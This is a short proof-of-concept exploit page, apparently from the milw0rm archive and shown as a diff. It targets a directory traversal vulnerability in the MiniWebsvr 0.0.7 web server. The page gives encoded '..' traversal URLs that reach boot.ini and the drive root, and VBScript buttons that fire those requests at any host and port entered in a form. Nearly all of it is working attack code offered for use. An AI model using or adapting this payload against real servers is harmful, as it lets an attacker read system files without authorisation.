@@ -1,0 +1,34 @@
+<pre>
+<code><span style="font: 10pt Courier New;"><span class="general1-symbol">-------------------------------------------------------------
+<b>MiniWebsvr 0.0.7 Directory transversal vulnerability</b>
+url: http://miniwebsvr.sourceforge.net/
+author: shinnai
+mail: shinnai[at]autistici[dot]org
+site: http://shinnai.altervista.org
+
+http://localhost/%5C..%5C..%5C..%5C..%5C..%5C../boot.ini or
+http://localhost/%5C..%5C..%5C..%5C..%5C..%5C../
+-------------------------------------------------------------
+
+Host			Port
+<input type=text name=txtIP value = "localhost">	<input type=text name=txtPort value = "8080">
+
+<input language=VBScript onclick=GetBoot() type=button value="Click to get boot.ini">
+
+<input language=VBScript onclick=BrowseMe() type=button value="Click to browse">
+
+<script language='vbscript'>
+Sub GetBoot
+  on error resume next
+  document.location = "http://" + txtIP.value + ":" + txtPort.value + "/%5C..%5C..%5C..%5C..%5C..%5C../boot.ini"
+end sub
+
+Sub BrowseMe
+  on error resume next
+  document.location = "http://" + txtIP.value + ":" + txtPort.value + "/%5C..%5C..%5C..%5C..%5C..%5C../"
+end sub
+</script>
+</span></span>
+</code></pre>
+
+# milw0rm.com [2007-04-11]
